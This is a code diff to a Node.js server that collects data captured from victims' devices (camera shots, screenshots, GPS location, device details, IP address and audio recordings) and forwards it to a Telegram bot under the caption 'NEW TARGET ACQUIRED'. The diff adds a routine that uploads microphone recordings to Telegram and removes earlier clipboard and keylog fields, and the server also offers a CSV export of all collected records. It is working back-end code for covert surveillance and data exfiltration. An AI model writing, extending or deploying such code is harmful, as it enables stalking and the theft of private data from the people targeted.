@@ -3,6 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 8080;
@@ -40,7 +41,6 @@ async function sendTelegramPhoto(imageData, caption) {
         const buffer = Buffer.from(base64Image, 'base64');
         
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const FormData = require('form-data');
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', buffer, { filename: 'capture.jpg' });
@@ -53,6 +53,28 @@ async function sendTelegramPhoto(imageData, caption) {
         console.log('✅ Telegram photo sent!');
     } catch (error) {
         console.error('❌ Telegram photo error:', error.message);
+        await sendTelegramMessage(caption);
+    }
+}
+
+async function sendTelegramAudio(audioData, caption) {
+    try {
+        const base64Audio = audioData.replace(/^data:audio\/\w+;base64,/, '');
+        const buffer = Buffer.from(base64Audio, 'base64');
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('audio', buffer, { filename: 'recording.webm' });
+        formData.append('caption', caption || '🎤 Audio Recording');
+        formData.append('parse_mode', 'HTML');
+        
+        await axios.post(url, formData, {
+            headers: formData.getHeaders()
+        });
+        console.log('✅ Telegram audio sent!');
+    } catch (error) {
+        console.error('❌ Telegram audio error:', error.message);
         await sendTelegramMessage(caption);
     }
 }
@@ -93,8 +115,7 @@ app.post('/api/store', async (req, res) => {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
             userPhoto, audioData, ipAddress, fullDeviceInfo,
-            networkSpeed, liveLocation, captureCount, 
-            clipboardData, keylogData, screenCapture
+            networkSpeed, liveLocation, captureCount
         } = req.body;
 
         const newEntry = {
@@ -110,9 +131,6 @@ app.post('/api/store', async (req, res) => {
             networkSpeed: networkSpeed || {},
             liveLocation: liveLocation || {},
             captureCount: captureCount || 0,
-            clipboardData: clipboardData || null,
-            keylogData: keylogData || null,
-            screenCapture: screenCapture || null,
             timestamp: new Date().toISOString()
         };
 
@@ -124,8 +142,9 @@ app.post('/api/store', async (req, res) => {
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
 📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
-📡 IP: ${ipAddress || 'Unknown'}
 📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
+🏭 Manufacturer: ${fullDeviceInfo?.manufacturer || 'Unknown'}
+📡 IP: ${ipAddress || 'Unknown'}
 📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
 🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
 🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
@@ -139,6 +158,11 @@ app.post('/api/store', async (req, res) => {
             await sendTelegramPhoto(screenshot, caption);
         } else {
             await sendTelegramMessage(caption);
+        }
+        
+        // Send audio if available
+        if (audioData) {
+            await sendTelegramAudio(audioData, '🎤 Audio Recording');
         }
 
         res.json({ success: true, message: 'Data stored!', id: newEntry._id });
@@ -164,7 +188,7 @@ app.get('/api/get-ip', (req, res) => {
 // ==========================================
 app.get('/api/export-csv', (req, res) => {
     try {
-        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures,Clipboard,Keylog\n';
+        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
         
         allData.forEach(item => {
             const row = [
@@ -178,9 +202,7 @@ app.get('/api/export-csv', (req, res) => {
                 item.fullDeviceInfo?.connection?.type || 'Unknown',
                 item.networkSpeed?.download || 'Unknown',
                 item.audioData ? 'Yes' : 'No',
-                item.captureCount || 1,
-                item.clipboardData ? 'Yes' : 'No',
-                item.keylogData ? 'Yes' : 'No'
+                item.captureCount || 1
             ];
             csv += row.join(',') + '\n';
         });
